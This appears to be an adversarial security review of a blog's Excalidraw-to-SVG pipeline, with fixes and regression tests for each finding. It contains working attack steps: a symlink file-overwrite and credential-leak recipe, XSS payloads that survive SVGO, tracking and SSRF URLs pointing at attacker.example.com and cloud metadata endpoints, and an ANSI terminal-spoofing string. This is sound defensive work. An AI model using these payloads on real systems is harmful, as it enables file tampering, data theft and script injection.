---
review: phase-04-excalidraw-pipeline-security
reviewed: 2026-05-04
reviewer: adversarial security review
scope:
  - scripts/excalidraw-to-svg.mjs
  - tests/unit/excalidraw-to-svg.test.ts
  - public/blog-assets/*/diagrams/*.svg (shipped artifacts)
  - @aldinokemal2104/excalidraw-to-svg@1.1.1 (wrapper internals)
  - svgo@4.0.0 (preset-default plugin manifest)
findings:
  critical: 2
  high: 2
  medium: 3
  low: 2
  info: 2
  total: 11
---

# Phase 4 — Adversarial Security Review

## Executive Summary

Two CRITICAL findings make the phase 4 pipeline exploitable **today** by anyone who commits a crafted `.excalidraw.json` via PR:

1. **BL-01 is confirmed exploitable** — symlink bypass of `validatePath` enables both **arbitrary file WRITE** (e.g. overwrite `~/.ssh/authorized_keys`) AND **arbitrary file READ with error-message disclosure** (e.g. leak `~/.aws/credentials` first bytes via stderr).
2. **T-04-02 defense-in-depth claim is FACTUALLY WRONG** — SVGO v4's `preset-default` does NOT include `removeScripts`. `<script>`, `onload`, `<foreignObject>`, `<iframe>`, and `javascript:` URIs all survive the optimize pass. The threat model's documented "defense-in-depth" does not exist.

Two HIGH findings:
3. **SSRF / tracking-pixel / external image loading** — the wrapper embeds `<image href="...">` with zero URL validation. Remote URLs, `file:///` URIs, and script-carrying `data:` URIs all survive SVGO.
4. **Silent parser-error writes** — when a crafted diagram breaks the wrapper's parser, the pipeline writes a 116-byte `<parsererror>` document as a `.svg`, reports SUCCESS, and ships it.

BL-02 (regex XML injection) is **currently latent, not exploitable via attacker-controlled JSON** — the wrapper's XMLSerializer normalizes `>` to `&gt;` in all attribute values tested. It remains a correctness time-bomb on future wrapper upgrades.

The shipped SVGs (MCP client-server, Karpenter split-ownership) are clean: zero `<script>`, zero `on*` handlers, zero external URLs. **No active compromise has been detected** — the risk is forward-looking, triggered by a malicious PR author.

---

## CRITICAL

### SEC-C01: `validatePath` symlink bypass — arbitrary file write + read-side info disclosure (CONFIRMED EXPLOITABLE)

**Priority:** CRITICAL

**Scope:** `scripts/excalidraw-to-svg.mjs:56-67` (re-confirms 04-REVIEW BL-01, expands it to include read-side disclosure).

**Attack scenario (reproducible bash):**

```bash
# Pre-requisite: attacker commits a PR that adds benign diagrams-source/*.excalidraw.json
#                + a symlink inside public/blog-assets/<slug>/diagrams/ that points at a victim file.
# On macOS, use $TMPDIR (not /tmp — that's a symlink that trips WR-02).

ATTACK_DIR="$TMPDIR/demo"
mkdir -p "$ATTACK_DIR/out"
echo "ORIGINAL_CONTENT" > "$ATTACK_DIR/victim.txt"
ln -sf "$ATTACK_DIR/victim.txt" "$ATTACK_DIR/out/output.svg"

cp tests/fixtures/excalidraw/minimal.excalidraw.json "$ATTACK_DIR/attack.excalidraw.json"
cp tests/fixtures/excalidraw/minimal.meta.json       "$ATTACK_DIR/attack.meta.json"

node scripts/excalidraw-to-svg.mjs "$ATTACK_DIR/attack.excalidraw.json" "$ATTACK_DIR/out/output.svg"
# → "✓ ../../../../var/folders/.../out/output.svg (5087 B)"  ← silent success

cat "$ATTACK_DIR/victim.txt"
# → <svg ...>  ← ORIGINAL_CONTENT has been OVERWRITTEN with SVG bytes
```

**Empirically confirmed on HEAD today (2026-05-04):** the write goes through the symlink. `victim.txt` went from 34 bytes of "ORIGINAL_CONTENT_DO_NOT_OVERWRITE" to 5087 bytes of valid SVG.

**Read-side extension — information disclosure via error message:**

```bash
# Point a srcPath symlink at a credentials file, run the script:
ln -sf ~/.aws/credentials "$ATTACK_DIR/read-attack.excalidraw.json"
echo '{"title":"x","descEn":"y"}' > "$ATTACK_DIR/read-attack.meta.json"

node scripts/excalidraw-to-svg.mjs "$ATTACK_DIR/read-attack.excalidraw.json" "$ATTACK_DIR/out2.svg"
# → "[excalidraw-to-svg] FAILED: Unexpected token '[', "[default]\n..." is not valid JSON"
#                                                  ^^^^^^^^^^^
#           first ~10 bytes of ~/.aws/credentials are echoed to stderr
```

JSON.parse's error message in Node ≥18 includes up to ~10 characters of the input. For `/etc/passwd`, `~/.ssh/id_rsa`, `.env`, or any structured text file, those 10 bytes are often enough to confirm file existence + leak a critical prefix (PEM header, username, API key prefix, etc.).

**Attack chain in the wild:**
1. PR adds `diagrams-source/innocuous/diagram.excalidraw.json` (real, innocent diagram).
2. Same PR adds `public/blog-assets/innocuous/diagrams/output.svg` as a **symlink** to `~/.ssh/authorized_keys` (or any sensitive path that the reviewer can write to on their dev machine).
3. Reviewer runs `node scripts/excalidraw-to-svg.mjs diagrams-source/innocuous/diagram.excalidraw.json public/blog-assets/innocuous/diagrams/output.svg` to regenerate the SVG (as the runbook instructs).
4. Their SSH authorized_keys is overwritten with SVG content — they get locked out of any host that uses that key. Or: the symlink is to a file committed to the repo, so the malicious SVG lands in `main` with the attacker's payload disguised as a legitimate diagram.

Git tracks symlinks as symlinks (mode 120000), which is visible in `git diff`, but a reviewer rubber-stamping a "benign diagram" PR may not notice the symlink until after they've run the pipeline locally.

**Recommended fix (code):**

```javascript
// scripts/excalidraw-to-svg.mjs — replace validatePath (lines 56-67)
function validatePath(userPath, label) {
  const resolved = path.resolve(userPath);

  // Dereference symlinks on every existing ancestor before the boundary check.
  // For paths that do not yet exist (output file), walk up to the first
  // existing directory, realpath THAT, then reattach the tail unchanged.
  let existing = resolved;
  while (!fsSync.existsSync(existing) && path.dirname(existing) !== existing) {
    existing = path.dirname(existing);
  }
  const realExisting = fsSync.realpathSync(existing);
  const tail = path.relative(existing, resolved);
  const real = tail ? path.join(realExisting, tail) : realExisting;

  const allowed =
    real === REPO_ROOT ||
    real.startsWith(REPO_ROOT + path.sep);
  // NOTE: drop TMP_ROOT here too — it's a trust-boundary weakening.
  //       Update tests to use a repo-local .tmp-test/ directory instead
  //       (see 04-REVIEW WR-01).
  if (!allowed) {
    throw new Error(`path traversal refused — ${label} (${userPath}) → ${real} resolves outside REPO_ROOT`);
  }
  return real;
}
```

Also add a regression test that creates a symlink inside a tempdir pointing outside REPO_ROOT and asserts the script refuses:

```typescript
// tests/unit/excalidraw-to-svg.test.ts — add
test('Security :: rejects-symlink-escape — destPath that is a symlink outside REPO_ROOT is refused', () => {
  const victim = path.join(os.tmpdir(), `victim-${Date.now()}.txt`);
  fs.writeFileSync(victim, 'SENTINEL');
  const attackDir = path.join(REPO_ROOT, '.tmp-test');
  fs.mkdirSync(attackDir, { recursive: true });
  const linkInRepo = path.join(attackDir, `link-${Date.now()}.svg`);
  fs.symlinkSync(victim, linkInRepo);
  try {
    const result = run([MINIMAL_SRC, linkInRepo]);
    assert.notEqual(result.status, 0, 'script must refuse symlink writes that escape REPO_ROOT');
    assert.equal(fs.readFileSync(victim, 'utf8'), 'SENTINEL', 'victim must remain untouched');
  } finally {
    if (fs.existsSync(linkInRepo)) fs.unlinkSync(linkInRepo);
    if (fs.existsSync(victim)) fs.unlinkSync(victim);
  }
});
```

**Confidence:** high — reproduced end-to-end on HEAD.

---

### SEC-C02: T-04-02 defense-in-depth claim is FALSE — SVGO v4 preset-default does NOT remove scripts, on-handlers, or javascript: URIs

**Priority:** CRITICAL

**Scope:** `scripts/excalidraw-to-svg.mjs:31-43` (SVGO_CONFIG), `04-02-PLAN.md:128` (T-04-02 mitigation claim), `node_modules/svgo/plugins/preset-default.js` (empirical plugin list).

**Empirical proof:**

```
$ grep -E "removeScripts|removeOnEvents" node_modules/svgo/plugins/preset-default.js
# no matches — neither plugin is in the preset
```

End-to-end test confirms payloads survive:

| Input SVG fragment                              | SVGO v4 preset-default output | Survives? |
|------------------------------------------------|------------------------------|-----------|
| `<script>alert(1)</script>`                    | unchanged                    | YES       |
| `<svg onload="alert(1)">`                      | unchanged                    | YES       |
| `<foreignObject><iframe src="javascript:..."/>`| unchanged                    | YES       |
| `<use href="javascript:alert(1)"/>`            | unchanged                    | YES       |
| `<image href="javascript:alert(1)"/>`          | unchanged                    | YES       |
| `<image href="https://evil.com/track.gif"/>`   | unchanged                    | YES       |

The T-04-02 mitigation in `04-02-PLAN.md` line 128 reads: *"SVGO `preset-default` includes `removeScripts` → strips `<script>` as defense-in-depth."* **This is factually incorrect for SVGO v4.** SVGO v4 removed `removeScripts` from `preset-default` (it's still available as an opt-in plugin named `removeScripts`, plus a `removeOnEvents` plugin — both must be explicitly added).

**Why this hasn't burned yet:** the current surface of attacker-controlled text is narrow. The wrapper (`@excalidraw/utils` → JSDOM serializer) escapes `<`/`>` in text content and attributes, so an attacker who only controls `elements[].text` cannot inject raw `<script>` — the wrapper outputs `&lt;script&gt;`. **But** as SEC-H01 below documents, the wrapper does NOT escape `files[*].dataURL` URIs, which opens a live injection surface.

**Attack scenarios that fire if any wrapper behavior regresses, OR if a new input field is added:**
- Excalidraw schema v3 could add a field that round-trips text into an attribute without escaping.
- A wrapper bug/regression (jsdom version bump, custom serializer) could omit an escape.
- A future plan adds user-provided CSS or HTML fragments for styling.

In all three cases, the pipeline would silently ship XSS-capable SVGs, because the threat model's defense-in-depth layer is vapor.

**Recommended fix (code):**

```javascript
// scripts/excalidraw-to-svg.mjs — SVGO_CONFIG (lines 31-43)
const SVGO_CONFIG = {
  multipass: true,
  plugins: [
    {
      name: 'preset-default',
      params: {
        overrides: {
          removeDesc: false,
        },
      },
    },
    // T-04-02 defense-in-depth — explicitly enable script/event removal.
    // preset-default in SVGO v4 does NOT include these.
    'removeScripts',
    'removeOnEvents',
  ],
};
```

And update `04-02-PLAN.md` T-04-02 row to reflect that `removeScripts` + `removeOnEvents` are EXPLICIT in the config, not transitive through `preset-default`.

Add regression test to `tests/unit/excalidraw-to-svg.test.ts`:

```typescript
// Feed a synthetic XSS payload through the pipeline; verify it's stripped post-SVGO.
test('Security :: strips-script-tags — SVGO pipeline must remove <script>/onload/javascript:', () => {
  // Would require a fixture with a crafted SVG — or test SVGO_CONFIG directly in a unit test
  // that imports optimize() and asserts on output of a synthetic input.
});
```

**Confidence:** high — read the SVGO v4 preset-default.js source + empirical round-trip test.

---

## HIGH

### SEC-H01: SSRF / privacy leak — `files.dataURL` embeds arbitrary URLs in `<image href>`, no validation, survives SVGO

**Priority:** HIGH

**Scope:** `@aldinokemal2104/excalidraw-to-svg@1.1.1` (wrapper renders `.files[fileId].dataURL` verbatim into `<image href>`), `scripts/excalidraw-to-svg.mjs` (no dataURL scheme validation before calling wrapper).

**Attack scenario:**

```bash
# Attacker commits diagrams-source/evil/diagram.excalidraw.json:
{
  "type": "excalidraw",
  "elements": [{"type":"image","fileId":"f1", ...}],
  "files": {
    "f1": {
      "mimeType": "image/png",
      "id": "f1",
      "dataURL": "https://attacker.example.com/pixel.gif?u=VISITOR_IP_VIA_SERVER_LOGS"
    }
  }
}
```

Running the script:
```
$ node scripts/excalidraw-to-svg.mjs diagrams-source/evil/diagram.excalidraw.json public/blog-assets/evil/diagrams/out.svg
✓ public/blog-assets/evil/diagrams/out.svg (XXX B)
```

The output SVG contains:
```xml
<image width="100%" height="100%" href="https://attacker.example.com/pixel.gif?u=VISITOR_IP_VIA_SERVER_LOGS"/>
```

Empirically verified: the full string survives the entire pipeline (wrapper → pre-SVGO injection → SVGO preset-default → write).

**Consequences when the SVG is loaded on vedmich.dev:**

| Loader context          | Effect                                                                 |
|-------------------------|------------------------------------------------------------------------|
| `<img src="out.svg">`   | Browser fetches `out.svg`. Does NOT fetch `<image href>` inside — SVG context in `<img>` treats external refs as data refs only. **But browser STILL loads the referenced image** into the SVG (modern browsers fetch subresources inside `<img src="foo.svg">`). Tracking beacon fires. |
| `<object data="out.svg">` / `<embed>` / `<iframe>` | Full SVG context. `<image href>` fetched. Scripts would execute (but we tested `removeScripts` is not on). |
| Direct navigation to `/out.svg` | Browser treats as SVG document. `<image href>` fetched. Privacy leak. |
| Crawlers/bots (Google, SEO tools, etc.) | Fetch `out.svg`, may follow `<image href>`. Long-tail tracking vector. |

Also an SSRF vector: `file:///etc/hosts` or `http://169.254.169.254/latest/meta-data/` (AWS IMDS) — on server-side SVG renderers (e.g. if the blog ever uses a Node-side SVG-to-image service), these URIs would be fetched by the server, exposing internal network / cloud metadata.

Empirical confirmation on HEAD:

```javascript
// Input: diagram.files.f1.dataURL = "file:///etc/hosts"
// Output SVG contains: <image href="file:///etc/hosts" preserveAspectRatio="none" width="100%" height="100%"/>
```

**Recommended fix (code):**

Add a `validateFilesUrls(diagram)` check before the wrapper call, alongside `validateFilesBlob`:

```javascript
// scripts/excalidraw-to-svg.mjs — new helper after validateFilesBlob
function validateFilesUrls(diagram) {
  const files = diagram.files || {};
  for (const [id, f] of Object.entries(files)) {
    if (f && typeof f.dataURL === 'string') {
      // Only allow data: URIs with embedded content — reject external URLs.
      if (!f.dataURL.startsWith('data:')) {
        throw new Error(
          `files[${id}].dataURL must be a data: URI (got "${f.dataURL.slice(0, 50)}..."). ` +
          `External URLs are refused to prevent SSRF and tracking-pixel embedding.`
        );
      }
      // Additionally reject data: URIs that decode to XML/HTML (SVG-in-SVG = XSS risk).
      const mime = f.dataURL.match(/^data:([^;,]+)/)?.[1] || '';
      if (/(svg|html|xml)/i.test(mime)) {
        throw new Error(
          `files[${id}].dataURL uses disallowed mimeType "${mime}". ` +
          `Only raster image formats (png, jpeg, gif, webp) may be embedded.`
        );
      }
    }
  }
}

// In main(), after validateFilesBlob:
validateFilesBlob(diagram);
validateFilesUrls(diagram);  // NEW
```

Also add the corresponding SVGO post-pass as defense-in-depth:

```javascript
// SVGO plugins (in addition to SEC-C02 fix):
{
  name: 'removeAttrs',
  params: { attrs: 'image:href:(?!data:)' },  // strip any <image href> that isn't data:
}
```

Regression test:

```typescript
test('Security :: rejects-external-image-urls — files.dataURL with http/file scheme is refused', () => {
  const src = path.join(os.tmpdir(), `ssrf-${Date.now()}.excalidraw.json`);
  const meta = src.replace(/\.excalidraw\.json$/, '.meta.json');
  fs.writeFileSync(src, JSON.stringify({
    type: 'excalidraw', version: 2, elements: [], appState: {},
    files: { f1: { dataURL: 'https://evil.com/pixel.gif', mimeType: 'image/gif', id: 'f1' } }
  }));
  fs.writeFileSync(meta, JSON.stringify({title:'x', descEn:'y'}));
  const result = run([src, path.join(os.tmpdir(), `ssrf-out-${Date.now()}.svg`)]);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr || '', /dataURL|data:|external/i);
  fs.unlinkSync(src); fs.unlinkSync(meta);
});
```

**Confidence:** high — reproduced end-to-end (input JSON → output SVG containing external URL).

---

### SEC-H02: Pipeline writes `<parsererror>` documents as `.svg`, reports SUCCESS — integrity / deployment risk

**Priority:** HIGH

**Scope:** `scripts/excalidraw-to-svg.mjs:122-156` (no validation that wrapper returned a real SVG; injection regex silently no-ops on non-`<svg>` root).

**Attack / malfunction scenario:**

A crafted `.excalidraw.json` with a `link` field containing unescaped XML-special characters (e.g. `"https://a.com/<x>"`) causes the wrapper's internal JSDOM DOMParser to return a `<parsererror>` document instead of an `<svg>`. Reproduction:

```javascript
// element with: link: "https://a.com/<x>"
// wrapper outerHTML:
// <parsererror xmlns="http://www.mozilla.org/newlayout/xml/parsererror.xml">2:109: disallowed character.</parsererror>
```

The script then:
1. `svgString.replace(/<svg([^>]*)>/, ...)` — no match (document starts with `<parsererror>`), silently no-op.
2. `optimize(svgString, SVGO_CONFIG)` — SVGO accepts non-SVG input, wraps as-is or passes through.
3. `Buffer.byteLength` — 116 bytes, well under 10 KB budget.
4. `fs.writeFile(destPath, optimized)` — writes the `<parsererror>` document to the `.svg` path.
5. Prints `✓ <path> (116 B)` — SUCCESS.

Empirically reproduced on HEAD today:

```
$ node scripts/excalidraw-to-svg.mjs ./parsererror.excalidraw.json ./out.svg
✓ ./out.svg (116 B)
  title: Test diagram
  desc: Five-element minimal fixture for pipeline smoke test

$ cat out.svg
<parsererror xmlns="http://www.mozilla.org/newlayout/xml/parsererror.xml">2:109: disallowed character.</parsererror>
```

**Deployment impact:** the "success" exit code means this file would pass any CI gate, get committed as a legitimate diagram, deploy to production, and render as a broken image on the blog. Browsers will either display a red "broken image" icon or (in some SVG renderers) display the literal parsererror text as visible content. Not XSS, but:

- Content integrity: diagrams silently replaced with error blobs.
- Author DoS: any PR that trips a parser-error in the wrapper ships broken diagrams.
- Reporting: the stdout says "title: ..." and "desc: ..." even though the written file has neither.

**Recommended fix (code):**

```javascript
// scripts/excalidraw-to-svg.mjs — after the wrapper call (line 123)
const svgEl = await excalidrawToSvg(diagram);
let svgString = svgEl.outerHTML;

// Hard assertion: wrapper must return a real <svg> root.
if (!/^<svg[\s>]/.test(svgString)) {
  throw new Error(
    `wrapper did not return an <svg> element. First 200 chars of output: ${svgString.slice(0, 200)}`
  );
}
```

Regression test:

```typescript
test('Integrity :: rejects-parsererror — script refuses non-SVG wrapper output', () => {
  // Build a fixture with a link field containing "<" that trips the wrapper's DOMParser.
  const src = path.join(os.tmpdir(), `pe-${Date.now()}.excalidraw.json`);
  const meta = src.replace(/\.excalidraw\.json$/, '.meta.json');
  fs.writeFileSync(src, JSON.stringify({
    type: 'excalidraw', version: 2, elements: [{
      id: 'r1', type: 'rectangle', x: 10, y: 10, width: 100, height: 50,
      /* ... minimal element fields ... */
      link: 'https://a.com/<x>'  // triggers parsererror
    }],
    appState: {}, files: {}
  }));
  fs.writeFileSync(meta, JSON.stringify({title: 'x', descEn: 'y'}));
  const result = run([src, path.join(os.tmpdir(), `pe-out-${Date.now()}.svg`)]);
  assert.notEqual(result.status, 0, 'must refuse parsererror output');
  fs.unlinkSync(src); fs.unlinkSync(meta);
});
```

**Confidence:** high — reproduced end-to-end on HEAD.

---

## MEDIUM

### SEC-M01: `files` object with millions of empty keys bypasses size budget, exhausts memory

**Priority:** MEDIUM

**Scope:** `scripts/excalidraw-to-svg.mjs:69-81` (validateFilesBlob), attack is a DoS against the author's machine.

**Attack scenario:**

```json
{
  "type": "excalidraw",
  "elements": [],
  "files": {
    "k0": { "dataURL": "" },
    "k1": { "dataURL": "" },
    ...
    "k999999": { "dataURL": "" }
  }
}
```

The guard at lines 69-81 sums `dataURL.length` which is 0 for each entry — total = 0, passes the 100 KB cap. But `Object.values(files)` iterates 1 million objects, and the wrapper is then called with 1M-key files object (which may cause the worker's JSON round-trip to spike to multi-GB memory).

Confirmed: 1M empty-string keys add ~126 MB heap pressure to `validateFilesBlob` alone (node `--heap-prof` shows 159 MB heap after generation vs 33 MB start). The wrapper's worker_thread receives this via `postMessage` → full serialization copy → another ~126 MB. Low-memory CI runners can OOM.

Also: the `.excalidraw.json` source file itself can be arbitrarily large (already flagged WR-05 as medium in 04-REVIEW).

**Recommended fix (code):**

```javascript
// scripts/excalidraw-to-svg.mjs — strengthen validateFilesBlob
const FILES_ENTRY_CAP = 256;  // well above any real diagram

function validateFilesBlob(diagram) {
  const files = diagram.files || {};
  const entries = Object.entries(files);
  if (entries.length > FILES_ENTRY_CAP) {
    throw new Error(
      `files has ${entries.length} entries, exceeds ${FILES_ENTRY_CAP} cap — reject over-populated files map`
    );
  }
  let total = 0;
  for (const [, f] of entries) {
    if (f && typeof f.dataURL === 'string') total += f.dataURL.length;
  }
  if (total > FILES_BLOB_BUDGET) {
    throw new Error(
      `files blob is ${total} B, exceeds ${FILES_BLOB_BUDGET} B cap — reject oversized embedded rasters`
    );
  }
}
```

Also honor the WR-05 fix (cap `.excalidraw.json` file size at e.g. 1 MB before `fs.readFile`).

**Confidence:** high — reproduced with 1M-key generator on HEAD.

---

### SEC-M02: `meta.title` / `meta.descEn` ANSI-escape injection into terminal stdout

**Priority:** MEDIUM

**Scope:** `scripts/excalidraw-to-svg.mjs:162-163` (`console.log` of meta.title and meta.descEn unescaped).

**Attack scenario:**

A crafted `meta.json` with:
```json
{
  "title": "[2K[G[32m✓ deployed to production[0m",
  "descEn": "[?25l"
}
```

When the pipeline runs, the terminal rewrites the previous line, displays a fake success message in green, and hides the cursor. An attacker whose PR is merged and whose diagrams are regenerated by the author sees their terminal output deceive them.

Less interesting in practice (author-controlled meta), but worth noting because it's a 3-character fix.

**Recommended fix:**

```javascript
// Replace console.log lines 162-163 with:
const safePrint = (label, value) => {
  // Strip ANSI escape sequences and control chars from author-authored meta.
  const safe = String(value).replace(/[\x00-\x1F\x7F  ]/g, '?');
  console.log(`  ${label}: ${safe}`);
};
safePrint('title', meta.title);
safePrint('desc', meta.descEn);
```

**Confidence:** high — ANSI escapes demonstrably survive `console.log` on zsh/bash.

---

### SEC-M03: BL-02 regex fragility — latent correctness bug that will become XSS if wrapper output ever changes

**Priority:** MEDIUM (latent, currently not exploitable — re-confirms 04-REVIEW BL-02 with narrower risk assessment)

**Scope:** `scripts/excalidraw-to-svg.mjs:129-132` (the `/<svg([^>]*)>/` regex-based injection).

**Test result — CANNOT force `>` into an attribute via attacker-controlled JSON today:**

Ran all of the following payloads through the full wrapper + regex injection:

| Input field                                   | Wrapper output attribute                        | Regex split point |
|----------------------------------------------|-------------------------------------------------|-------------------|
| `text: "a>b"`                                | `text-anchor="middle"` + child `>a&gt;b<`       | Correct           |
| `link: "https://a.com/?>x"`                  | `href="https://a.com/?&gt;x"`                   | Correct           |
| `link: 'https://a.com/">x'`                  | `href="https://a.com/&amp;quot;&gt;x"`          | Correct           |
| `link: "https://a.com/<x>"`                  | `<parsererror>` (no `<svg>` root)               | N/A — see SEC-H02 |
| `files.dataURL: "data:image/png;base64,..."` | `href="data:image/png;..."` (verbatim)          | Correct           |

The wrapper's XMLSerializer consistently normalizes `>` → `&gt;` in all attribute values. **BL-02 is not exploitable today via attacker JSON.**

**But the risk remains latent:**
- The wrapper is a 3rd-party package at exact pin 1.1.1. A version bump to 1.2.x could add a field, change the serializer, or emit custom-formatted attributes. The pipeline's correctness would silently drift.
- A future plan that adds user-provided SVG fragments (e.g. a custom CSS class, a label HTML) would sidestep the wrapper's escaping and directly feed the regex.
- `npm audit` cannot detect "wrapper emits `>` in attributes" because that's not a CVE.

**Recommended fix (code) — switch from regex to DOM manipulation:**

```javascript
// scripts/excalidraw-to-svg.mjs — replace lines 122-132 with DOM injection
const svgEl = await excalidrawToSvg(diagram);

// Use the existing JSDOM document the wrapper already has — svgEl.ownerDocument.
const doc = svgEl.ownerDocument;
const titleEl = doc.createElement('title');
titleEl.textContent = meta.title;   // textContent handles escaping natively
const descEl = doc.createElement('desc');
descEl.textContent = meta.descEn;
svgEl.insertBefore(descEl, svgEl.firstChild);
svgEl.insertBefore(titleEl, svgEl.firstChild);
let svgString = svgEl.outerHTML;

// Drop the escapeXml() call — textContent above handles this.
```

This eliminates both the regex's XML-awareness gap AND the escapeXml custom logic (which has a known gap for control chars and U+0000).

**Confidence:** medium (BL-02 itself is confirmed latent, not exploitable today via standard wrapper behavior).

---

## LOW

### SEC-L01: `loading="eager"` vs `loading="lazy"` — minor timing-oracle, informational only

**Priority:** LOW

**Scope:** `src/content/blog/en/2026-03-02-mcp-servers-plainly-explained.md` (eager), `src/content/blog/en/2026-03-20-karpenter-right-sizing.mdx` (lazy).

**Security analysis:**

`loading="eager"` vs `"lazy"` affects *when* the browser fetches the image, not *what* is fetched. From a security standpoint:

- If SEC-H01 is unfixed and a malicious SVG contains `<image href="https://attacker.com/pixel">`, `loading="eager"` fires the beacon on page load; `"lazy"` fires it when the viewer scrolls to the diagram. Both leak the user's IP + user agent. The `loading` attribute is not a meaningful mitigation.
- `loading="eager"` does NOT expose more data than `"lazy"` — both use the same Referer/UA/cookies.
- No known timing-oracle attack where `loading` distinction leaks which SVG the viewer has seen (the server logs show the request regardless).

The inconsistency is a code-style issue, not a security issue. Consistent `loading="lazy"` is the modern default; `loading="eager"` should only be used for above-the-fold LCP images. The MCP diagram (first non-hero image on that post) arguably is above-the-fold, so `eager` is defensible — but worth documenting the rule.

**Recommended fix:** none required for security. If addressed for code hygiene, unify to `loading="lazy"` except for explicitly-above-the-fold images, and document the rule in `diagrams-source/README.md`.

**Confidence:** high.

---

### SEC-L02: Null bytes and control chars pass through `escapeXml` → malformed SVG (DoS / a11y break)

**Priority:** LOW

**Scope:** `scripts/excalidraw-to-svg.mjs:46-50` (escapeXml regex `/[<>&"']/g` only escapes 5 metachars).

**Analysis:**

`escapeXml('a\0b')` → `'a\0b'` (null byte survives). XML 1.0 forbids U+0000 anywhere in a document. Modern browsers either silently drop the null byte or refuse to parse the SVG. SVGO may also choke.

Similarly, `escapeXml('a\x01b')` through `'a\x1Fb'` survive — XML 1.0 allows TAB, LF, CR (U+0009, U+000A, U+000D) but bans the other C0 control chars. A payload with U+000B (vertical tab) would produce an invalid SVG that some parsers accept and others reject — a cross-browser consistency issue.

Not a security bug (it's author-controlled data), but a completeness gap in the T-04-02 mitigation.

**Recommended fix:** bundle with SEC-M03 — switch to DOM `textContent` which handles this correctly.

**Confidence:** high.

---

## INFO

### SEC-I01: Shipped SVGs are clean — zero XSS payload, zero external refs

**Priority:** INFO

**Scope:** `public/blog-assets/2026-03-02-mcp-servers-plainly-explained/diagrams/client-server.svg`, `public/blog-assets/2026-03-20-karpenter-right-sizing/diagrams/split-ownership.svg`.

**Empirical grep:**

```
$ grep -iE "<script|onload|onclick|onerror|javascript:|foreignObject|<iframe" \
    public/blog-assets/**/diagrams/*.svg
# no matches — both files clean
```

Additional checks:
- Both SVGs contain `<title>` and `<desc>` (a11y intact).
- Both SVGs have `xmlns="http://www.w3.org/2000/svg"` (proper SVG namespace).
- `client-server.svg` embeds a Virgil `@font-face` base64 payload (5 KB) — legitimate subset font, not XSS.
- `split-ownership.svg` has zero `@font-face` (see 04-REVIEW WR-04 — uses Helvetica system font, not a security issue).
- Neither file contains `<image href>` to any URL (no SSRF payload shipped).

**Verdict:** no active compromise. The CRITICAL findings above are about PREVENTING future compromise, not remediating current state.

**Confidence:** high.

---

### SEC-I02: Wrapper rejects `javascript:` and `data:` in `element.link` — partial defense-in-depth exists

**Priority:** INFO

**Scope:** `@aldinokemal2104/excalidraw-to-svg@1.1.1` internal behavior (observed empirically).

**Observation:** when `element.link = "javascript:alert(1)"` or `element.link = "data:text/html,..."`, the wrapper emits NO `<a href>` wrapper at all — the element is rendered without the link. This is wrapper behavior (not our script's), but it's worth documenting because it's a non-obvious safeguard.

The wrapper does NOT similarly sanitize `files[*].dataURL` (see SEC-H01 — remote URLs pass through). So the defense is asymmetric: `link` is sanitized, `dataURL` is not.

**Recommended action:** none — just document in `04-CONTEXT.md` the asymmetry so future plans don't assume dataURL is sanitized.

**Confidence:** high — confirmed by round-trip testing 6 link URIs + 3 dataURL URIs through the wrapper.

---

## Not reproduced / refuted

- **Prototype pollution via `JSON.parse(__proto__)`** — NOT exploitable. Modern Node (≥6) treats `__proto__` in JSON as a regular own-property, not a prototype slot. `JSON.parse('{"__proto__":{"x":1}}').x` is `undefined`, object prototypes untouched.
- **ReDoS in `escapeXml`** — NOT exploitable. Regex `/[<>&"']/g` is a simple character class, linear time.
- **ReDoS in viewBox match** — NOT exploitable. Tested with 100,000 digits per group, completes in <1 ms. No catastrophic backtracking path exists in `(\d+(?:\.\d+)?)` for digit-only inputs.
- **Command injection via filename** — NOT exploitable. Script uses `fs.readFile` / `fs.writeFile`, no `exec`, no shell interpolation of `process.argv`.
- **XXE in JSON or SVG parse** — NOT exploitable. JSON.parse doesn't have entities. JSDOM's `DOMParser` doesn't resolve external entities (JSDOM 24.x default, no `resources: "usable"`).
- **Null-byte-in-path bypass of validatePath** — NOT exploitable. `path.resolve` silently strips null bytes on Node 20+; `fs.writeFile` rejects them with `ERR_INVALID_ARG_VALUE`.

---

## Summary Recommendations (priority order)

| # | Priority | Finding | Fix Complexity |
|---|----------|---------|----------------|
| 1 | CRITICAL | SEC-C01 — realpath-based validatePath + drop TMP_ROOT | ~15 LOC |
| 2 | CRITICAL | SEC-C02 — add `removeScripts` + `removeOnEvents` to SVGO plugins | 2 LOC |
| 3 | HIGH     | SEC-H01 — validateFilesUrls refuses non-`data:` schemes | ~15 LOC |
| 4 | HIGH     | SEC-H02 — assert wrapper returned real `<svg>` root | 3 LOC |
| 5 | MEDIUM   | SEC-M01 — cap `files` entries (256) + source file size (1 MB) | ~8 LOC |
| 6 | MEDIUM   | SEC-M03 — switch injection from regex to DOM textContent | ~10 LOC (also fixes SEC-L02 + BL-02) |
| 7 | MEDIUM   | SEC-M02 — ANSI-strip on stdout echoes of meta | ~5 LOC |

Total estimated fix size: ~60 LOC + ~5 new regression tests.

**Highest-leverage single change:** fix SEC-M03 (DOM-based injection). That change alone closes SEC-L02, mitigates BL-02 latency, and modernizes the script from regex-driven string surgery to proper DOM manipulation — the same DOM the wrapper already produces.

---

_Reviewed: 2026-05-04 by adversarial security review. All CRITICAL findings reproduced end-to-end on HEAD._
